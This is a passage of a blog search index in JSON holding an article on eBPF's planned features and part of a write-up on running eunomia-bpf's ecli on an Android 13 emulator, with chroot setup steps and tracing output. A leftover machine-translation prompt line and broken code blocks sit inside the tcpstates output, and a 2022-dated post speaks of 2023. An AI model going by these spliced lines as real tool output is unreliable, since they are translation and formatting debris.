before.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#from-no-loops-to-powerful-iterators-how-did-control-flow-in-ebpf-evolve","title":"From No Loops to Powerful Iterators: How Did Control Flow in eBPF Evolve?","text":"<p>Early eBPF programs were limited in their control flow capabilities\u2014loops weren\u2019t supported to keep programs simple and verifiable. While this approach ensured safety, it also restricted what developers could achieve, limiting the complexity of eBPF applications.</p> <p>Over the years, eBPF has gradually introduced more advanced looping mechanisms:</p> <ul> <li>2014: No support for loops, maintaining simplicity and safety.</li> <li>2019: Introduction of bounded loops, allowing loops with a fixed number of iterations.</li> <li>2021: Addition of the <code>bpf_loop()</code> helper function, providing more flexibility for looping constructs.</li> <li>2023: Implementation of open-coded iterators, offering even more powerful and efficient looping mechanisms.</li> <li>2024 (Planned): Introduction of <code>cond_break</code> to allow breaking out of loops based on specific conditions.</li> </ul> <p>These enhancements enable developers to write more complex and efficient eBPF programs. With support for loops and advanced iterators, eBPF can handle sophisticated data processing tasks and perform real-time analytics directly within the kernel. This evolution in control flow capabilities has unlocked new possibilities for what eBPF can achieve, making it a more versatile tool for developers.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#shaping-the-future-whats-next-for-ebpf","title":"Shaping the Future: What\u2019s Next for eBPF?","text":"<p>As we look to the future, eBPF continues to evolve with cutting-edge features and enhancements that promise to revolutionize how we interact with system internals. Let\u2019s explore some of the exciting developments on the horizon and the opportunities and challenges they present.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#how-will-kfuncs-make-kernel-interfaces-more-flexible","title":"How Will kfuncs Make Kernel Interfaces More Flexible?","text":"<p>Traditionally, BPF helper functions had fixed user-space APIs (UAPIs) with hard-coded IDs, limiting eBPF's flexibility and extensibility. The introduction of the kfunc mechanism changes this dynamic. Kfuncs allow kernel modules to define their own helper functions for BPF, providing a more flexible and extensible interface.</p> <p>This means developers can extend eBPF's capabilities without waiting for kernel updates. Custom helper functions can be tailored to specific needs, fostering innovation and enabling new use cases that were previously out of reach. For more details, see the Tutorial on kfuncs.</p> <p>By allowing kernel modules to define their own helpers, kfuncs make the eBPF ecosystem more adaptable and responsive to emerging requirements, ensuring that eBPF remains relevant and powerful in a rapidly changing technological landscape.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#what-are-struct-ops-and-how-do-they-enhance-ebpf","title":"What Are Struct-Ops and How Do They Enhance eBPF?","text":"<p>Adding new eBPF attach types for kernel subsystems has been challenging due to the lack of a stable interface. The struct-ops mechanism addresses this by allowing sets of BPF programs to act as callbacks for stable kernel APIs like TCP congestion control.</p> <p>This opens the door for eBPF to integrate deeply with various kernel subsystems, such as:</p> <ul> <li>Schedulers: Creating custom eBPF task scheduling policies to optimize CPU usage.</li> <li>HID (Human Interface Devices): Developing unique eBPF input device handling mechanisms.</li> <li>FUSE (Filesystem in Userspace): Implementing flexible and efficient eBPF fuse solutions.</li> <li>Queuing Disciplines: Managing network traffic more effectively, reducing latency, and improving throughput. See the link for details.</li> </ul> <p>Struct-ops enable eBPF to enhance performance and flexibility across these subsystems, making it a versatile tool for a wide range of kernel-level customizations. By providing a stable interface, struct-ops simplify the integration process, encouraging more widespread adoption and innovative applications of eBPF in system management and optimization.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#how-does-bpf_arena-enhance-data-structures-in-ebpf","title":"How Does bpf_arena Enhance Data Structures in eBPF?","text":"<p>As eBPF use cases expand, there's a growing need for more complex data structures like trees and graphs. The introduction of bpf_arena addresses this by providing a shared memory space between BPF and user space. bpf_arena allows developers to implement intricate algorithms and data structures directly within eBPF programs.</p> <p>With bpf_arena, developers can handle more sophisticated data processing tasks, optimize memory usage, and improve access patterns. This enhancement paves the way for eBPF to support advanced applications that require robust data management capabilities. Detailed capabilities are outlined in the eBPF documentation.</p> <p>By facilitating the creation of complex data structures, bpf_arena significantly broadens the scope of what eBPF can achieve, enabling more advanced analytics, monitoring, and optimization tasks within the kernel.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#why-are-bpf-libraries-important-for-a-rich-ecosystem","title":"Why Are BPF Libraries Important for a Rich Ecosystem?","text":"<p>Sharing code across BPF programs has historically been challenging due to dependency management issues. Inspired by languages like Rust and Python, the future of eBPF lies in robust library support. By distributing libraries as source code, developers can simplify dependencies and encourage code reuse.</p> <p>This approach fosters a community-driven ecosystem where developers can build on each other's work, reducing duplication and accelerating development. A rich library ecosystem will make it easier to create feature-rich eBPF applications, driving broader adoption and innovation.</p> <p>Robust BPF libraries provide standardized tools and functions that developers can leverage, enhancing productivity and ensuring consistency across different eBPF projects. This collective effort not only speeds up development but also improves the overall quality and reliability of eBPF applications.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#how-will-arbitrary-locks-improve-concurrency-in-ebpf","title":"How Will Arbitrary Locks Improve Concurrency in eBPF?","text":"<p>Current locking mechanisms in eBPF, such as <code>bpf_spin_lock()</code>, are limited and prone to deadlocks. This restricts the development of more complex, concurrent BPF applications. The proposed solution is a new locking system that supports multiple locks and prevents deadlocks.</p> <p>This upgrade will allow more sophisticated concurrency patterns within BPF programs, enabling developers to build more reliable and efficient applications. With better concurrency support, eBPF can handle more demanding tasks without compromising system stability. Learn more from LWN.net and the eBPF Documentation.</p> <p>Improved concurrency mechanisms will enhance the performance and scalability of eBPF applications, making them more suitable for high-performance environments where multiple operations need to run simultaneously without interference.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#what-does-embracing-turing-completeness-mean-for-ebpf","title":"What Does Embracing Turing Completeness Mean for eBPF?","text":"<p>eBPF is already Turing complete, meaning it can perform any computation given enough resources. However, to fully leverage this potential, additional features like jump tables and indirect goto instructions are needed. These enhancements will enable more dynamic and flexible control flow within eBPF programs.</p> <p>With these improvements, eBPF can support even more powerful and flexible programming models within the kernel. This will push the boundaries of what eBPF can achieve, opening up new possibilities for developers. Embracing Turing completeness fully will allow eBPF to handle more complex algorithms and processes, making it an even more indispensable tool for system programming and optimization.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#making-ebpf-even-better-instruction-set-and-registers","title":"Making eBPF Even Better: Instruction Set and Registers","text":""},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#how-will-evolving-the-bpf-instruction-set-isa-improve-ebpf","title":"How Will Evolving the BPF Instruction Set (ISA) Improve eBPF?","text":"<p>Certain operations in eBPF remain clunky or inefficient. Enhancing the instruction set can make a significant difference in both performance and ease of use. Proposed enhancements include:</p> <ul> <li>Indirect Calls: Introducing new opcodes to simplify and speed up function calls. See LPC talk.</li> <li>Bit Manipulation: Adding instructions for common bit operations, such as finding and counting bits, can optimize frequent tasks. See the LPC talk.</li> </ul> <p>These additions will make eBPF programs more efficient and easier to write, expanding their usability and performance. Detailed specifications can be found in the Kernel Docs.</p> <p>By refining the instruction set, eBPF becomes more powerful and versatile, allowing developers to write more optimized and feature-rich programs without unnecessary complexity.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#what-optimizations-can-be-made-to-ebpf-registers","title":"What Optimizations Can Be Made to eBPF Registers?","text":"<p>Different architectures offer varying numbers of registers, and eBPF can sometimes be inefficient in how it uses them. Potential improvements include:</p> <ul> <li>Virtual Registers: Abstracting away hardware limitations to maximize efficiency.</li> <li>Register Spilling/Filling: Optimizing how registers are used and managed to prevent bottlenecks.</li> <li>More Hardware Registers: Allowing compilers to take advantage of additional registers when available.</li> </ul> <p>Better register management means faster and more efficient eBPF programs, enhancing overall performance and making eBPF a more powerful tool for developers. Optimizing register usage is crucial for ensuring that eBPF can handle increasingly complex tasks without running into resource limitations.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#how-can-ebpf-handle-more-function-arguments","title":"How Can eBPF Handle More Function Arguments?","text":"<p>Currently, eBPF functions are limited to passing five arguments due to register constraints. To overcome this limitation, two solutions are proposed:</p> <ul> <li>Additional Registers: Utilizing more registers where possible to pass extra arguments.</li> <li>Stack Space: Passing extra arguments via the stack, carefully managing performance and safety.</li> </ul> <p>These solutions will provide more flexibility in function calls, allowing for more complex and capable eBPF programs. For more information, see the instruction set and Stack Overflow.</p> <p>Enhancing the ability to handle more function arguments will enable developers to write more comprehensive and feature-rich eBPF programs, expanding the scope of applications that can be efficiently managed within the kernel.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#ambitious-goals-compiling-the-kernel-to-bpf-isa","title":"Ambitious Goals: Compiling the Kernel to BPF ISA","text":"<p>Imagine if significant parts of the Linux kernel could be compiled to the BPF instruction set. This vision would revolutionize kernel development and analysis, offering several exciting benefits:</p> <ul> <li>Enhanced Analysis: Monitoring and verifying kernel behavior becomes easier with BPF\u2019s flexible programmability.</li> <li>Flexibility: Quickly adapting and updating kernel components without needing a full recompilation.</li> </ul> <p>This ambitious goal envisions a more dynamic and adaptable kernel, driven by the power and flexibility of eBPF. It could lead to more efficient kernel development cycles and a more resilient operating system overall. Discussions on this can be found in LWN.net and the IETF Draft on BPF ISA.</p> <p>Compiling the kernel to BPF ISA would allow developers to write and deploy kernel modules with the same ease and flexibility that eBPF already provides, streamlining development and enhancing system reliability.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#memory-management-upgrades-dynamic-stacks-and-more","title":"Memory Management Upgrades: Dynamic Stacks and More","text":""},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#how-can-we-break-free-from-the-512-byte-stack-limit","title":"How Can We Break Free from the 512-Byte Stack Limit?","text":"<p>eBPF programs currently face a strict 512-byte stack limit, which restricts their complexity and the types of computations they can perform. To overcome this limitation, introducing <code>alloca()</code> will allow dynamic memory allocation within eBPF programs.</p> <p>With <code>alloca()</code>, the stack can grow as needed, enabling more complex functions and data structures. This enhancement will allow developers to create more sophisticated and feature-rich eBPF programs, expanding the range of possible applications. Details are available in the bpf_arena_alloc_pages.</p> <p>Breaking free from the stack limit will empower developers to implement more intricate logic and handle larger datasets within eBPF programs, enhancing their capabilities and applications.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#safer-programs-cancellable-ebpf-scripts","title":"Safer Programs: Cancellable eBPF Scripts","text":""},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#how-can-we-ensure-ebpf-programs-remain-safe-and-efficient","title":"How Can We Ensure eBPF Programs Remain Safe and Efficient?","text":"<p>Long-running eBPF programs can consume significant CPU resources, potentially leading to system instability. To address this, new mechanisms for safely canceling these programs are proposed.</p> <p>Implementing timeouts will automatically terminate programs that run too long, while watchdogs can monitor and manage program execution. Additionally, providing safe cancellation points ensures that programs can be stopped without causing system issues.</p> <p>These safeguards will make eBPF programs more reliable and stable, even when handling complex tasks, ensuring that the system remains responsive and secure. By introducing these safety mechanisms, eBPF can be used more confidently in critical environments where system stability is paramount.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#expanding-observability-to-user-space","title":"Expanding Observability to User Space","text":""},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#how-is-ebpf-making-user-space-monitoring-easier","title":"How Is eBPF Making User-Space Monitoring Easier?","text":"<p>Observing what's happening in user-space applications is inherently more complex than monitoring the kernel. Diverse programming languages and runtime environments add to the challenge. However, eBPF is evolving to bridge this gap.</p> <p>Innovations like Fast Uprobes offer efficient user-space probes with minimal performance impact. User-Space Statically Defined Tracing (USDT) allows applications to define their own tracing points, providing more granular monitoring. Additionally, language-specific stack walkers for languages like C++, Python, and Java can interpret their specific stack frames, offering meaningful trace information.</p> <p>These advancements enable more comprehensive and detailed monitoring of user-space applications, providing better insights and debugging capabilities for developers and system administrators. By extending observability into user space, eBPF ensures that every aspect of system performance can be meticulously tracked and optimized.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#rethinking-limits-the-1-million-instruction-cap","title":"Rethinking Limits: The 1 Million Instruction Cap","text":""},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#should-we-relax-the-1-million-instruction-limit-in-ebpf","title":"Should We Relax the 1 Million Instruction Limit in eBPF?","text":"<p>Currently, eBPF programs are limited to 1 million instructions to ensure they remain verifiable and terminate correctly. While this safeguard maintains system stability, it also limits the complexity of what eBPF programs can achieve.</p> <p>There's an ongoing debate about relaxing this limit for programs that can demonstrate forward verification progress. Balancing the need for more complex programs with system safety and performance is crucial. If successfully implemented, this change could allow more sophisticated eBPF applications, expanding their usefulness without compromising security or stability. For more insights, refer to LWN.net.</p> <p>Relaxing the instruction limit could unlock new possibilities for eBPF, allowing it to handle more extensive and intricate tasks while still maintaining the necessary safeguards to protect system integrity.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#modularizing-ebpf-independent-kernel-modules","title":"Modularizing eBPF: Independent Kernel Modules","text":""},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#what-are-the-benefits-of-making-ebpf-a-separate-kernel-module","title":"What Are the Benefits of Making eBPF a Separate Kernel Module?","text":"<p>There has been significant discussion about making eBPF an independent kernel module. Imagine being able to update the eBPF subsystem without needing to update the entire kernel. This vision is becoming a reality by making BPF a separate kernel module.</p> <p>This modular approach offers several advantages:</p> <ul> <li>Faster Updates: New features and fixes can be rolled out more quickly without waiting for full kernel releases.</li> <li>Reduced Dependency: Developers and users don\u2019t have to wait for kernel updates to leverage the latest eBPF capabilities.</li> <li>Increased Flexibility: Experimentation and innovation can proceed without being tied to kernel release cycles.</li> </ul> <p>This shift will lead to a more agile and responsive eBPF ecosystem, keeping pace with rapid technological advancements and developer needs. By decoupling eBPF from the kernel, updates and improvements can be deployed more efficiently, enhancing the overall user experience and system performance.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#expanding-ebpf-to-other-platforms","title":"Expanding eBPF to Other Platforms","text":"<p>Beyond Linux, eBPF's capabilities are extending to other platforms, broadening its impact and utility across different environments.</p> <p>Furthermore, eBPF for Windows extends eBPF's capabilities beyond Linux, enabling developers to utilize eBPF's powerful features on Windows systems. This cross-platform support opens up new avenues for developers who work in heterogeneous environments, allowing them to apply eBPF's benefits regardless of the operating system.</p> <p>Additionally, Userspace eBPF runtime such as bpftime overcomes kernel-space limitations, unlocking even more potential for eBPF applications. By enabling user-space execution of eBPF application such as bcc-tools or bpftrace, bpftime allows for greater flexibility and experimentation, making eBPF accessible to a wider range of use cases and developers.</p> <p>Expanding eBPF to other platforms ensures that its powerful features are available to a broader audience, promoting innovation and enhancing system performance across diverse operating systems.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#whats-next-for-ebpf","title":"What's Next for eBPF?","text":"<p>eBPF has already tackled major challenges in tracing, observability, and programmable networking. But the journey doesn\u2019t stop here. The future holds even more exciting possibilities:</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#how-will-bpf-lsm-expand-ebpf-into-security","title":"How Will bpf-lsm Expand eBPF into Security?","text":"<p>bpf-lsm (BPF Linux Security Modules) allows eBPF to enforce custom security policies. This means developers can tailor security measures to specific needs, leveraging eBPF\u2019s power to monitor and control system behavior in real-time. With bpf-lsm, eBPF can play a crucial role in enhancing system security, offering more granular and dynamic protection mechanisms.</p> <p>By integrating security directly into the kernel via eBPF, bpf-lsm provides a flexible and powerful way to implement and manage security policies, making systems more resilient against threats and vulnerabilities.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#can-ebpf-optimize-scheduling-for-better-performance","title":"Can eBPF Optimize Scheduling for Better Performance?","text":"<p>Applying eBPF to task and packet scheduling can lead to better performance and resource management. For task scheduling, eBPF can create custom scheduling policies that optimize CPU usage based on specific workloads. For packet scheduling, eBPF can manage network traffic more effectively, reducing latency and improving throughput. These optimizations will result in more efficient and responsive systems capable of handling diverse workloads with ease. Check out the sched-ext/scx repository for more details.</p> <p>Optimizing scheduling with eBPF ensures that system resources are utilized more effectively, enhancing overall performance and user experience, especially in environments with varying and demanding workloads.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#ebpfs-guiding-principles","title":"eBPF's Guiding Principles","text":"<p>At the heart of eBPF\u2019s evolution are three core principles:</p> <ol> <li>To Innovate: Continuously pushing the boundaries of what's possible in both kernel and user-space programming.</li> <li>To Enable Others to Innovate: Providing tools and frameworks that empower developers to build new and exciting solutions.</li> <li>To Challenge What is Possible: Breaking through existing limitations and redefining what operating systems can do.</li> </ol> <p>These principles ensure that eBPF remains a cutting-edge tool, driving forward the future of computing by fostering creativity and overcoming challenges. By adhering to these guiding tenets, eBPF continues to evolve and adapt, maintaining its position at the forefront of system development and optimization.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#conclusion","title":"Conclusion","text":"<p>Looking back, it's clear that eBPF has come a long way\u2014from its humble beginnings in programmable networking to becoming a powerhouse for tracing, observability, and beyond. The future is even brighter, with exciting features on the horizon that promise to make eBPF even more powerful, flexible, and user-friendly.</p> <p>These developments, along with tools like LLMs such as GPTtrace, eBPF for Windows, and bpftime, are making eBPF more accessible and versatile across different environments, further cementing its role as a critical tool in modern system development. Additionally, we are leveraging large language models to better understand eBPF code in the kernel through projects like code-survey, enhancing our ability to analyze and optimize eBPF programs.</p> <p>As we move into the next decade, eBPF stands ready to tackle new challenges and unlock new possibilities. Whether you're a developer looking to optimize your applications, a system administrator striving for better performance, or just a tech enthusiast eager to explore the latest innovations, eBPF has something to offer.</p> <p>For more details and interesting topics, please visit BPFConf 2024.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#references","title":"References","text":"<ol> <li>Wikipedia - An overview of eBPF\u2019s journey and its capabilities to run programs securely in the kernel.</li> <li>Isovalent Blog - Chronicles the story behind eBPF\u2019s creation and its impact on the tech industry.</li> <li>IO Visor - XDP allows for efficient packet processing directly in the kernel, offering significant performance enhancements.</li> <li>XDP - A framework for fast packet processing that illustrates the advantages of integrating XDP with eBPF applications.</li> <li>BPF Type Format - BTF provides essential type information that enhances the verifiability and portability of BPF applications.</li> <li>libbpf Documentation - Skeleton files ease the interaction between user space and BPF programs, optimizing the management of global variables.</li> <li>GitHub Discussion - Discusses how global variables can be accessed and managed within eBPF applications.</li> <li>Speaker Deck - Analyzes the functioning and verification of control flows within eBPF.</li> <li>Kernel Docs - Provides insights on kernel functions that enhance the flexibility and extensibility of BPF applications.</li> <li>Kfunc Tutorial - Describes how custom kfuncs enable more powerful interactions between kernel functions and eBPF programs.</li> <li>eBPF Docs - Explains how struct-ops improve performance and allow for more elaborate interfaces between BPF programs and kernel subsystems.</li> <li>LWN.net - Discusses bpf_arena as a memory region that supports custom data structures shared between BPF programs and user space.</li> <li>eBPF Docs - Details the capabilities of bpf_arena in managing complex data structures.</li> <li>Red Hat Developers - Discusses the role of libbpf in streamlining interactions and enhancing program development.</li> <li>LWN.net - Explains the significance of arbitrary locks in managing concurrency in eBPF, enhancing process integrity.</li> <li>eBPF Documentation - Offers a comprehensive overview of concurrency management techniques within eBPF programs.</li> <li>Isovalent - Confirms that eBPF is Turing complete, capable of solving any computable problem with potential applications spanning various domains.</li> <li>Kernel Docs - Outlines the specifications and historical context of BPF ISA, along with recent enhancements for better performance.</li> <li>Stack Overflow - Offers insights into how parameters can be accessed and managed within eBPF functions.</li> <li>Standardizing the BPF ISA - LWN.net - Discusses the broader implications of compiling kernel modules to use BPF ISA and the benefits it brings.</li> <li>IETF Draft on BPF ISA - Examines the details surrounding BPF ISA and its roadmap for future enhancements.</li> <li>bpf_arena_alloc_pages - Details the introduction of <code>alloca()</code> for dynamic memory allocation within eBPF programs.</li> <li>sched-ext/scx - Repository for task and packet scheduling optimizations using eBPF.</li> </ol> <p>Share on  Share on </p>"},{"location":"blog/2022/09/11/running-the-ecli-on-android-13/","title":"Running the ecli on Android 13","text":"<p>Author: CH3CHOHCH3</p> <p>This article mainly records the author's exploration process, results, and encountered issues when testing the support level of the high version Android Kernel for CO-RE technology based on libbpf in the Android Studio Emulator. The testing method used is to build a Debian environment in the Android Shell environment and attempt to build the eunomia-bpf toolchain and run its test cases based on this environment.</p>"},{"location":"blog/2022/09/11/running-the-ecli-on-android-13/#background","title":"Background","text":"<p>As of now (2023-04), Android has not provided good support for dynamic loading of eBPF programs. Whether it is the compiler distribution scheme represented by bcc or the CO-RE scheme based on btf and libbpf, they are largely dependent on the support of the Linux environment and cannot run well on the Android system <sup>2</sup>.</p> <p>However, there have been some successful cases of trying eBPF on the Android platform. In addition to the scheme provided by Google, which modifies <code>Android.bp</code> to build and mount eBPF programs with the entire system <sup>1</sup>, some people have proposed the idea of \u200b\u200bbuilding a Linux environment based on the Android kernel to run eBPF toolchains and have developed related tools.</p> <p>Currently existing materials mostly rely on adeb/eadb to build Linux sandboxes based on the Android kernel and test bcc and bpftrace toolchains, but there is less testing work on the CO-RE scheme. There are more reference materials for using the bcc tool on Android, such as:</p> <ul> <li>SeeFlowerX: https://blog.seeflower.dev/category/eBPF/</li> <li>evilpan: https://bbs.kanxue.com/thread-271043.htm</li> </ul> <p>The main idea is to use chroot to run a Debian image on the Android kernel and build the entire bcc toolchain in it, thus using eBPF tools. The principle is similar if you want to use bpftrace.</p> <p>In fact, the high version of the Android kernel already supports the btf option, which means that the emerging CO-RE technology in the eBPF field should also be able to be applied to Linux systems based on the Android kernel. This article will test and run eunomia-bpf in the emulator environment based on this.</p> <p>eunomia-bpf is an open-source project that combines libbpf and WebAssembly technologies, aiming to simplify the writing, compiling, and deployment of eBPF programs. This project can be regarded as a practical way of CO-RE, which relies on libbpf at its core. It is believed that the testing work of eunomia-bpf can provide reference for other CO-RE schemes.</p>"},{"location":"blog/2022/09/11/running-the-ecli-on-android-13/#testing-environment","title":"Testing Environment","text":"<ul> <li>Android Emulator (Android Studio Flamingo | 2022.2.1)</li> <li>AVD: Pixel 6</li> <li>Android Image: Tiramisu Android 13.0 x86_64 (5.15.41-android13-8-00055-g4f5025129fe8-ab8949913)</li> </ul>"},{"location":"blog/2022/09/11/running-the-ecli-on-android-13/#environment-setup","title":"Environment Setup <sup>3</sup>","text":"<ol> <li>Obtain <code>debianfs-amd64-full.tar.gz</code> from the releases page of the eadb repository as the rootfs of the Linux environment, and also get the <code>assets</code> directory of the project to build the environment.</li> <li>Configure and start the Android Virtual Device in Android Studio's Device Manager.</li> <li>Use the adb tool of the Android Studio SDK to push <code>debianfs-amd64-full.tar.gz</code> and the <code>assets</code> directory to the AVD:</li> <li><code>./adb push debianfs-amd64-full.tar.gz /data/local/tmp/deb.tar.gz</code></li> <li><code>./adb push assets /data/local/tmp/assets</code></li> <li>Use adb to enter the Android shell environment and obtain root permissions:</li> <li><code>./adb shell</code></li> <li><code>su</code></li> <li>Build and enter the Debian environment in the Android shell:</li> <li><code>mkdir -p /data/eadb</code></li> <li><code>mv /data/local/tmp/assets/* /data/eadb</code></li> <li><code>mv /data/local/tmp/deb.tar.gz /data/eadb/deb.tar.gz</code>+ <code>rm -r /data/local/tmp/assets</code></li> <li><code>chmod +x /data/eadb/device-*</code></li> <li><code>/data/eadb/device-unpack</code></li> <li><code>/data/eadb/run /data/eadb/debian</code></li> </ol> <p>The Linux environment required for testing eBPF has been built. In addition, in the Android shell (before entering debian), you can use <code>zcat /proc/config.gz</code> with <code>grep</code> to view the kernel compilation options.</p> <p>Currently, the debian environment packaged by eadb has a low libc version and lacks many tool dependencies. Additionally, due to different kernel compilation options, some eBPF functionalities may not be available. </p>"},{"location":"blog/2022/09/11/running-the-ecli-on-android-13/#tool-building","title":"Tool Building","text":"<p>Clone the eunomia-bpf repository to the local debian environment. For specific building process, please refer to the build.md in the repository. In this test, I used the <code>ecc</code> compiler to generate <code>package.json</code>, and the build and usage methods of this tool can be found on the repository page.</p> <p>During the building process, you may need to manually install tools such as <code>curl</code>, <code>pkg-config</code>, <code>libssl-dev</code>, etc. </p>"},{"location":"blog/2022/09/11/running-the-ecli-on-android-13/#test-results","title":"Test Results","text":""},{"location":"blog/2022/09/11/running-the-ecli-on-android-13/#successful-cases","title":"Successful Cases","text":""},{"location":"blog/2022/09/11/running-the-ecli-on-android-13/#bootstrap","title":"bootstrap","text":"<p>The running output is as follows:</p> <pre><code>TIME     PID     PPID    EXIT_CODE  DURATION_NS  COMM    FILENAME  EXIT_EVENT\n09:09:19  10217  479     0          0            sh      /system/bin/sh 0\n09:09:19  10217  479     0          0            ps      /system/bin/ps 0\n09:09:19  10217  479     0          54352100     ps                1\n09:09:21  10219  479     0          0            sh      /system/bin/sh 0\n09:09:21  10219  479     0          0            ps      /system/bin/ps 0\n09:09:21  10219  479     0          44260900     ps                1\n</code></pre>"},{"location":"blog/2022/09/11/running-the-ecli-on-android-13/#tcpstates","title":"tcpstates","text":"<p>After monitoring starts, download the web page using <code>wget</code> in the Linux environment:</p> <pre><code>TIME     SADDR   DADDR   SKADDR  TS_US   DELTA_US  PID     OLDSTATE  NEWSTATE  FAMILY  SPORT   DPORT   TASK\n09:07:46  0x4007000200005000000000000f02000a 0x5000000000000f02000a8bc53f77 18446635827774444352 3315344998 0 10115 7 2 2 0 80 wget\n09:07:46  0x40020002d98e50003d99f8090f02000a 0xd98e50003d99f8090f02000a8bc53f77 18446635827774444352 3315465870 120872 0 2 1 2 55694 80 swapper/0\n09:07:46  0x40010002d98e50003d99f8090f02000a 0xd98e50003d99f8090f02000a8bc53f77 18446635827774444352 3315668799 202929 10115 1 4 2 55694 80 wget\".\n</code></pre> <p>format: Return only the translated content, not including the original text.09:07:46  0x40040002d98e50003d99f8090f02000a 0xd98e50003d99f8090f02000a8bc53f77 18446635827774444352 3315670037 1237 0 4 5 2 55694 80 swapper/0 09:07:46  0x40050002000050003d99f8090f02000a 0x50003d99f8090f02000a8bc53f77 18446635827774444352 3315670225 188 0 5 7 2 55694 80 swapper/0 09:07:47  0x400200020000bb01565811650f02000a 0xbb01565811650f02000a6aa0d9ac 18446635828348806592 3316433261 0 2546 2 7 2 49970 443 ChromiumNet 09:07:47  0x400200020000bb01db794a690f02000a 0xbb01db794a690f02000aea2afb8e 18446635827774427776 3316535591 0 1469 2 7 2 37386 443 ChromiumNet</p> <p>Begin testing by opening the Chrome browser on the Android Studio simulation  and visiting the Baidu webpage:</p> <pre><code>TIME     SADDR   DADDR   SKADDR  TS_US   DELTA_US  PID     OLDSTATE  NEWSTATE  FAMILY  SPORT   DPORT   TASK\n07:46:58  0x400700020000bb01000000000f02000a 0xbb01000000000f02000aeb6f2270 18446631020066638144 192874641 0 3305 7 2 2 0 443 NetworkService\n07:46:58  0x40020002d28abb01494b6ebe0f02000a 0xd28abb01494b6ebe0f02000aeb6f2270 18446631020066638144 192921938 47297 3305 2 1 2 53898 443 NetworkService\n07:46:58  0x400700020000bb01000000000f02000a 0xbb01000000000f02000ae7e7e8b7 18446631020132433920 193111426 0 3305 7 2 2 0 443 NetworkService\n07:46:58  0x40020002b4a0bb0179ff85e80f02000a 0xb4a0bb0179ff85e80f02000ae7e7e8b7 18446631020132433920 193124670 13244 3305 2 1 2 46240 443 NetworkService\n07:46:58  0x40010002b4a0bb0179ff85e80f02000a 0xb4a0bb0179ff85e80f02000ae7e7e8b7 18446631020132433920 193185397 60727 3305 1 4 2 46240 443 NetworkService\n07:46:58  0x40040002b4a0bb0179ff85e80f02000a 0xb4a0bb0179ff85e80f02000ae7e7e8b7 18446631020132433920 193186122 724 3305 4 5 2 46240 443 NetworkService\n07:46:58  0x400500020000bb0179ff85e80f02000a 0xbb0179ff85e80f02000ae7e7e8b7 18446631020132433920 193186244 122 3305 5 7 2 46240 443 NetworkService\n07:46:59  0x40010002d01ebb01d0c52f5c0f02000a 0xd01ebb01d0c52f5c0f02000a51449c27 18446631020103553856 194110884 0 5130 1 8 2 53278 443 ThreadPoolForeg\".07:46:59  0x400800020000bb01d0c52f5c0f02000a 0xbb01d0c52f5c0f02000a51449c27 18446631020103553856 194121000 10116 3305 8 7 2 53278 443 NetworkService\n07:46:59  0x400700020000bb01000000000f02000a 0xbb01000000000f02000aeb6f2270 18446631020099513920 194603677 0 3305 7 2 2 0 443 NetworkService\n07:46:59  0x40020002d28ebb0182dd92990f02000a 0xd28ebb0182dd92990f02000aeb6f2270 18446631020099513920 194649313 45635 12 2 1 2 53902 443 ksoftirqd/0\n07:47:00  0x400700020000bb01000000000f02000a 0xbb01000000000f02000a26f6e878 18446631020132433920 195193350 0 3305 7 2 2 0 443 NetworkService\n07:47:00  0x40020002ba32bb01e0e09e3a0f02000a 0xba32bb01e0e09e3a0f02000a26f6e878 18446631020132433920 195206992 13642 0 2 1 2 47666 443 swapper/0\n07:47:00  0x400700020000bb01000000000f02000a 